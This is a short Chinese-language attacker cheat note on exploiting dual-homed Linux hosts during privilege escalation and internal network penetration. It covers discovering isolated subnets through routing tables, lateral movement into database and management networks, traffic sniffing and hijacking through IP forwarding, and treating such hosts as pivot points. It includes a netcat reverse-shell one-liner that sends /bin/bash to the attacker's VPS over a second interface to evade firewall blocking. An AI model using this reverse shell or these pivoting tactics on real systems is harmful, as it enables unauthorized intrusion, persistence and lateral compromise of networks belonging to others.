# 双线路（双路由 / 双网卡）在**Linux 提权、内网渗透**里的核心用处



双线路 = 这台机器**能通两个网段**，提权不只是拿 root，还能**横向移动、绕防火墙、多出口反弹 Shell、抓更多内网信息**

------

## 1. 发现隐藏内网网段（最常用！）

`ip route` 看到两条线路，比如：

```
192.168.1.0/24 dev eth0
10.0.0.0/24 dev eth1
```

说明：

- eth0：能通**办公网**

- eth1：能通

  核心业务网 / 数据库网 / 管理网

  

  普通用户看不到，但

  拿到权限后，就能访问另一个隔离网段

  ，直接横向打服务器、数据库。

👉 提权意义：**从一台机器，打通整个内网**

## 2. 双出口反弹 Shell，绕过防火墙 / 策略拦截

两条外网线路（两个网关）：

- 线路 1：电信出口
- 线路 2：联通出口

防火墙可能只封了其中一个 IP，你可以：

bash

运行

```
# 指定走eth1网卡反弹Shell
nc -e /bin/bash 你的VPS 4444 -i eth1
```

用另一条线路**绕过拦截，成功上线**。

👉 提权意义：**提权成功后稳定维持权限，不容易被断连接**

## 3. 默认路由权重，用来嗅探 / 抓包、流量劫持

两条默认路由，Linux 会轮询走线路。

提权拿到 root 后：

- 开启 IP 转发，做**流量代理、抓包**
- 把流量引流到另一条线路，绕过内网安全设备

👉 提权意义：**做内网代理，渗透其他机器**

## 4. 漏洞利用：多网卡更容易本地提权

双网卡机器一般是：

**服务器、网关、堡垒机、运维机**

这类机器：

- 权限配置混乱

- 运维常用 sudo、计划任务、弱口令

- 容易有 SUID 漏洞、环境变量漏洞

  

  比普通电脑更容易提权到 root

👉 提权意义：**目标价值更高，拿到就是内网关键节点**

## 5. 实战极简记忆

1. `ip route` 看两条线路 = **跨网段入口**
2. 提权 root 后 = **打通隔离内网 + 多出口反弹 Shell + 内网横向**
3. 双网卡主机 = **高价值跳板机**
